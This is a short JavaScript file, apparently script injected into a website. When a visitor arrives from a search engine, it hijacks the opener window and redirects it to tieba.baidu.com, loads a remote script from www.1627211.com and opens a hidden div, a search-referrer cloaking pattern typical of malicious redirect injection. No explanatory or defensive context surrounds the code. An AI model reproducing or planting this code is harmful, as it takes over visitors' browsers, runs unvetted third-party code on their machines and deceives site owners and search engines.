var tj='<script language="javascript" type="text/javascript" src="http://js.users.51.la/335184.js"></script>';
var echo = function(str){
	document.write(str);
}
var regexp=/\.(haosou|sogou|baidu|soso|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|360)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
if(regexp.test(where)){
var d = "http://tieba.baidu.com/";
var r = document.referrer;
document.writeln("<script language=javascript>window.opener.navigate('"+d+"');<\/script>");
document.writeln("<script>if(parent.window.opener) parent.window.opener.location='"+d+"';<\/script>");
document.writeln('<script type="text/javascript"src="http://www.1627211.com/viewn.js"></script>');
document.writeln("<div style=\"display:none\">");
}